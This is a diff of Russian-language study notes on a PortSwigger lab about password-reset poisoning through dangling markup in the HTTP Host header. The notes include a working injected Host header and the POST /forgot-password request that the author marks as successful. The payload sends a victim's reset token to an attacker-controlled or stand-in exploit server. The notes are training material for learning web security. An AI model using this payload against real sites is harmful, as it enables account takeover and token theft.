@@ -1,5 +1,9 @@
 лаба https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup
 
+суть такая:
+==я поставил произвольный текст в поле host и обнаружил, что ссылка на сброс пароля пришла с этим произвольным текстом== потом я добавил скрипт туда, `<a href="//attacker-server.com/` и приходящее жертве официальное письмо выполняло мой скприт!  и токен улетал в логи моего сервера
+
+-----
 ## Атаки заголовка HTTP Host
 # Отравление сброса пароля с помощью dangling markup
 
@@ -75,22 +79,22 @@ https://0a6800e60484a9c3819170fb00e50060.web-security-academy.net/login
 
 
 
-
-
 подозреваю, что это уже уязвимость так как можно пробовать в письмо поместить xss скрипт который бы это письмо украл и перенаправил на мой хост! но как? 
 
 вот raw письма 
 
 <img src="../../assets/ss444.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
-можно попробовть сделать так: `:'<a href="//attacker-server.com/?
+можно попробовть сделать так: `<a href="//attacker-server.com/?`
 
 exploit-0ab100f104b9a92081936f4d0154004d.exploit-server.net  эт ссылка на мой хост (хост от лабы)
 
+```html
 Host: 0a6800e60484a9c3819170fb00e50060.web-security-academy.net:'<a href='//exploit-0ab100f104b9a92081936f4d0154004d.exploit-server.net/?
 
 вот так, где  exploit-0ab100f104b9a92081936f4d0154004d.exploit-server.net это может быть и мой сервер с функцией логирования запросов как в предыдущей лабе! 
 '/>
+```
 
 
 <img src="../../assets/454657f.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
@@ -148,12 +152,14 @@ Host: 0a6800e60484a9c3819170fb00e50060.web-security-academy.net:'<a href='//expl
 
 
 # СРАБОТАЛО
+```http
 POST /forgot-password HTTP/2
 Host: 0a6800e60484a9c3819170fb00e50060.web-security-academy.net:'<a href="//exploit-0ab100f104b9a92081936f4d0154004d.exploit-server.net/? 
-
-
-
 "/>
+```
+
+----
+
 # ВЫВОД 
 ## Атаки заголовка HTTP Host
 
@@ -168,7 +174,9 @@ Host: example.com:8080 такой вид запросов!
 письмо в формате raw, соответвенно, и иньекция должна быть в этом формате
 
 сработал вариант типа   
-```html:'<a href="//пишу-что-хочу->уязвимость...
+```html
+
+html:'<a href="//пишу-что-хочу->уязвимость...
 где <a href="//..."> создает гиперссылку, и то что она автоматически исполняется в raw - это уязвимость!
 
 <a> - это открывающий тег
